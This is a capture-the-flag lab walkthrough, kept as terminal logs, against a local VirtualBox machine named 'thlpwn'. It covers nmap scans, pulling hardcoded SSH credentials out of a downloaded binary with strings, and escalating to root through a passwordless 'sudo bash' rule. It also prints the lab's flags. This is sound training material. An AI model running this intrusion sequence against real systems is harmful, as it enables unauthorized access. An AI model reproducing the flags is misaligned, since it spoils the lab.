──(kali㉿kali)-[~/Documents/thlpwn]
└─$ cat scan.txt 
# Nmap 7.95 scan initiated Mon Oct 27 11:47:37 2025 as: /usr/lib/nmap/nmap --privileged -sS -p- --open --min-rate 5000 -Pn -n -oN scan.txt 192.168.56.10
Nmap scan report for 192.168.56.10
Host is up (0.000084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:8E:66:29 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

# Nmap done at Mon Oct 27 11:47:40 2025 -- 1 IP address (1 host up) scanned in 2.96 seconds


================================================================================================================================


──(kali㉿kali)-[~/Documents/thlpwn]
└─$ cat fullscan.txt 
# Nmap 7.95 scan initiated Mon Oct 27 11:52:48 2025 as: /usr/lib/nmap/nmap --privileged -sVC -p22,80 -vvv -n -Pn -oN fullscan.txt 192.168.56.10
Nmap scan report for 192.168.56.10
Host is up, received arp-response (0.00037s latency).
Scanned at 2025-10-27 11:52:49 EDT for 6s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA9i7hiBgZdbqok5ESuJPFfkPuRpcCT6UEeh71LyPq3i2pfdC6S1w4UYO17jknxy06B1COEcaGELE4n2KCor3M4=
|   256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaMroBaMRuicicDHyP1mRMULBpy4OqNENpp/l/O/cIq
80/tcp open  http    syn-ack ttl 64 nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.22.1
|_http-title: 403 Forbidden
MAC Address: 08:00:27:8E:66:29 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 27 11:52:55 2025 -- 1 IP address (1 host up) scanned in 6.85 seconds
                                                                                                                                                             



================================================================================================================================



<div class="links">
            <a href="admin/">Admin Panel</a> |
            <a href="api/">API Documentation</a> |
            <a href="downloads/">Downloads</a> |
            <a href="backup/">Backups</a> |
            <a href="uploads/">Uploads</a>
        </div>


================================================================================================================================

http://thlpwn.thl/downloads/




📦 Download Center
🔧 Authentication Checker Binary
Filename: auth_checker

Size: 16588 bytes

Type: ELF Binary

Description: Authentication tool with known security issues

⬇️ Download Binary



================================================================================================================================
┌──(kali㉿kali)-[~/Documents/thlpwn]
└─$ ls
auth_checker  fullscan.txt  scan.txt
                                                                                                                                                             
┌──(kali㉿kali)-[~/Documents/thlpwn]
└─$ strings auth_checker 
/lib64/ld-linux-x86-64.so.2
fgets
stdin
puts
exit
putchar
fflush
strlen
getchar
stdout
strcspn
__libc_start_main
printf
__isoc99_scanf
strcmp
libc.so.6
GLIBC_2.7
GLIBC_2.34
GLIBC_2.2.5
__gmon_start__
PTE1
H=p@@
2v*H
   THLPWN Authentication Checker      
   Version 1.0 - Secure System        
 VULNERABILITY EXPLOITED SUCCESSFULLY! 
  SSH Access Credentials:
  ========================
  Username: thluser
  Password: 9Kx7mP2wQ5nL8vT4bR6zY
  Connect with:
  ssh thluser@xxx.xxx.xxx.xxx
  First Flag Location:
  cat ~/flag.txt
[*] Enter authentication code: 
[!] Buffer overflow detected!
[!] Security check bypassed!
[-] Access Denied
[?] Hint: Try a longer input (60+ characters)...
[*] Enter password: 
Th3M4st3rK3y2024
[+] Correct password!
[-] Incorrect password
[?] Hint: The password is hardcoded in the binary...
[?] Try: strings auth_checker | grep -i key
Select authentication method:
  1. Password authentication
  2. Code verification (VULNERABLE)
  3. Exit
Choice: 
Invalid input
Goodbye!
Invalid option
;*3$"
GCC: (Debian 12.2.0-14+deb12u1) 12.2.0
crt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
auth_final.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
putchar@GLIBC_2.2.5
__libc_start_main@GLIBC_2.34
stdout@GLIBC_2.2.5
puts@GLIBC_2.2.5
stdin@GLIBC_2.2.5
_edata
_fini
strlen@GLIBC_2.2.5
printf@GLIBC_2.2.5
strcspn@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
strcmp@GLIBC_2.2.5
getchar@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
fflush@GLIBC_2.2.5
_end
_dl_relocate_static_pie
__bss_start
main
show_credentials
simple_check
__isoc99_scanf@GLIBC_2.7
print_banner
exit@GLIBC_2.2.5
__TMC_END__
vulnerable_check
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
          
================================================================================================================================



ssh thluser@192.168.56.10 
  Password: 9Kx7mP2wQ5nL8vT4bR6zY


┌──(kali㉿kali)-[~/Documents/thlpwn]
└─$ ssh thluser@192.168.56.10 
thluser@192.168.56.10's password: 
Linux thlpwn 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 28 17:33:14 2025 from 192.168.56.7
================================================================================================================================

thluser@thlpwn:~$ whoami
thluser
thluser@thlpwn:~$ ls
flag.txt
thluser@thlpwn:~$ cat flag.txt 
THL{3x7K9mL2pQ8vW5nR4zT6yH}
thluser@thlpwn:~$ 



================================================================================================================================

thluser@thlpwn:~$ 
thluser@thlpwn:~$ sudo -l
Matching Defaults entries for thluser on thlpwn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User thluser may run the following commands on thlpwn:
    (ALL) NOPASSWD: /bin/bash
thluser@thlpwn:~$ 
================================================================================================================================

thluser@thlpwn:~$ sudo bash
root@thlpwn:/home/thluser# whoami
root
root@thlpwn:/home/thluser# cd /root/
root@thlpwn:~# ls
root.txt
root@thlpwn:~# cat root.txt 
THL{9sT2mK7xQ5pL3wV8nZ6bR4}
root@thlpwn:~# 

================================================================================================================================

================================================================================================================================

================================================================================================================================